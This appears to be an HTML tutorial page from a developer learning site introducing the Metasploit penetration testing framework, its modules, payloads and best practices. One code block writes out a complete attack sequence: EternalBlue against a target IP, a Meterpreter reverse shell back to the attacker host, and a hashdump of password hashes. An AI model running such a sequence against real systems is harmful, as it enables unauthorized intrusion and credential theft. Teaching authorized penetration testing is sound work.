@@ -1,0 +1,180 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Metasploit Framework — Coduxium XI</title>
+    <meta name="description" content="Master Metasploit - The world's most used penetration testing framework.">
+    <link rel="stylesheet" href="../../../css/main.css" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../../../components/scroll-to-top/scroll-to-top.css">
+</head>
+
+<body>
+    <header class="site-header">
+        <div class="container header-inner">
+            <div class="brand">
+                <span class="logo">💻</span>
+                <div>
+                    <h1><a href="../../../index.html">Coduxium XI</a></h1>
+                    <p class="sub">Metasploit Framework</p>
+                </div>
+            </div>
+            <div class="header-actions">
+                <a href="../../../index.html" class="btn">← Back</a>
+                <button id="btn-theme" class="btn ghost" aria-label="Toggle theme">🌓</button>
+            </div>
+        </div>
+    </header>
+
+    <main class="container" style="padding: 40px 0;">
+        <article class="content-page">
+            <h2>🎯 Metasploit Framework</h2>
+            <p class="intro">The world's most used penetration testing framework for finding, exploiting, and validating
+                vulnerabilities.</p>
+
+            <section class="framework-section">
+                <h3>Overview</h3>
+                <div class="badge-group">
+                    <span class="badge">Penetration Testing</span>
+                    <span class="badge">Exploitation</span>
+                    <span class="badge">Security</span>
+                    <span class="badge">Ruby</span>
+                </div>
+                <p>Metasploit Framework is an open-source penetration testing platform that enables security
+                    professionals to find, exploit, and validate vulnerabilities. It includes a vast database of known
+                    vulnerabilities and exploits.</p>
+            </section>
+
+            <section class="framework-section">
+                <h3>Key Features</h3>
+                <ul>
+                    <li><strong>Extensive Exploit Database</strong> — Thousands of exploits and payloads</li>
+                    <li><strong>Modular Architecture</strong> — Exploits, payloads, encoders, NOPs</li>
+                    <li><strong>Post-Exploitation</strong> — Privilege escalation and pivoting</li>
+                    <li><strong>Evasion Techniques</strong> — Bypass antivirus and firewalls</li>
+                    <li><strong>Meterpreter</strong> — Advanced payload for post-exploitation</li>
+                    <li><strong>Automation</strong> — Script and automate penetration tests</li>
+                    <li><strong>Integration</strong> — Works with other security tools</li>
+                    <li><strong>Community</strong> — Active development and contributions</li>
+                </ul>
+            </section>
+
+            <section class="framework-section">
+                <h3>Common Use Cases</h3>
+                <ul>
+                    <li>Vulnerability assessment and exploitation</li>
+                    <li>Penetration testing engagements</li>
+                    <li>Security research and CVE validation</li>
+                    <li>Post-exploitation and lateral movement</li>
+                    <li>Social engineering attacks</li>
+                    <li>
+                    <li>Web application security testing</li>
+                    <li>Network and system penetration</li>
+                    <li>Red team operations</li>
+                </ul>
+            </section>
+
+            <section class="framework-section">
+                <h3>Core Components</h3>
+                <h4>Modules</h4>
+                <ul>
+                    <li><strong>Exploits</strong> — Code to take advantage of vulnerabilities</li>
+                    <li><strong>Payloads</strong> — Code to execute after successful exploitation</li>
+                    <li><strong>Auxiliary</strong> — Scanners, fuzzers, and other tools</li>
+                    <li><strong>Encoders</strong> — Evade signature detection</li>
+                    <li><strong>Post</strong> — Post-exploitation modules</li>
+                </ul>
+
+                <h4>Payloads</h4>
+                <ul>
+                    <li><strong>Meterpreter</strong> — Advanced multi-function payload</li>
+                    <li><strong>Shell</strong> — Command shell access</li>
+                    <li><strong>VNC</strong> — Remote desktop access</li>
+                    <li><strong>Staged vs Stageless</strong> — Deployment methods</li>
+                </ul>
+            </section>
+
+            <section class="framework-section">
+                <h3>Getting Started</h3>
+                <p>Install Metasploit (Kali Linux):</p>
+                <pre><code># Already pre-installed on Kali
+msfconsole
+
+# Update Metasploit
+msfupdate</code></pre>
+
+                <p>Basic exploitation workflow:</p>
+                <pre><code># Search for exploits
+msf6 > search type:exploit platform:windows
+
+# Use an exploit
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+
+# Set options
+msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100
+msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.10
+
+# Run exploit
+msf6 exploit(ms17_010_eternalblue) > exploit
+
+# Meterpreter session
+meterpreter > sysinfo
+meterpreter > getuid
+meterpreter > hashdump</code></pre>
+            </section>
+
+            <section class="framework-section">
+                <h3>Best Practices</h3>
+                <ul>
+                    <li>Always get proper authorization before testing</li>
+                    <li>Keep Metasploit updated regularly</li>
+                    <li>Use workspaces to organize engagements</li>
+                    <li>Document all actions and findings</li>
+                    <li>Practice in controlled lab environments</li>
+                    <li>Understand the exploits before using them</li>
+                    <li>Use evasion techniques responsibly</li>
+                    <li>Clean up after testing (remove artifacts)</li>
+                </ul>
+            </section>
+
+            <div class="lang-resources">
+                <a href="https://www.metasploit.com/" target="_blank" class="btn primary">Official Website</a>
+                <a href="https://docs.metasploit.com/" target="_blank" class="btn">Documentation</a>
+                <a href="https://github.com/rapid7/metasploit-framework" target="_blank" class="btn">GitHub</a>
+            </div>
+        </article>
+    </main>
+
+    <footer class="site-footer">
+        <div class="container footer-inner">
+            <small>Coduxium XI © 2025</small>
+            <div class="footer-links">
+                <a href="../../../index.html">Home</a>
+                <a href="https://github.com/Srijan-XI/Install-and-Learn-DevLangs" target="_blank">GitHub</a>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        const btn = document.getElementById('btn-theme');
+        const key = 'il-devlangs-theme';
+        const set = (val) => {
+            document.body.classList.toggle('light', val === 'light');
+            localStorage.setItem(key, val);
+        };
+        const stored = localStorage.getItem(key);
+        if (stored) set(stored); else set('dark');
+        btn.addEventListener('click', () => {
+            const cur = document.body.classList.contains('light') ? 'light' : 'dark';
+            set(cur === 'light' ? 'dark' : 'light');
+        });
+    </script>
+    <script src="../../../components/scroll-to-top/scroll-to-top.js"></script>
+</body>
+
+</html>
